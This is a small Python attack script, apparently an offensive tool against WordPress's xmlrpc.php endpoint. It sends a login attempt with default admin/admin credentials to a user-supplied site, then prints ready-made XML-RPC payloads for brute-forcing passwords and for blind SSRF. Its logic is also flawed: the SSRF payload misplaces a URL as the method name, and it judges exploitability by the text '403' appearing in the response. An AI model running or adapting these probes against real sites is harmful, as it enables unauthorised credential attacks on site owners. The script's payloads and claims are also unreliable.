import requests
import pyfiglet

text = "Meentest XMLRPC Exploitation:)"
ascii_art = pyfiglet.figlet_format(text)

print(ascii_art)

url = input("Enter URL: ")

username = "admin"
password = "admin"

url = url.rstrip('/') + "/xmlrpc.php"

payload = """<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>{0}</value></param>
<param><value>{1}</value></param>
</params>
</methodCall>
""".format(username, password)

headers = {
    'Content-Type': 'text/xml'
}

response = requests.post(url, headers=headers, data=payload)

if "403" in response.text:
    print("This site supported XMLRPC, you can exploit it, with this code:")
    print("For Brute Force:")
    print("""<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>""")
    print("For Blind SSRF:")
    print("""<methodCall>
   <methodName>https://meentest.net:2121</methodName>
  <params>
    <param>
      <value><string>https://google.com</string></value>
    </param>
    <param>
      <value><string>https://google.com/everything-about</string></value>
    </param>
  </params>
</methodCall>""")
else:
    print("xmlrpc is not exploited")

print("Bye!")
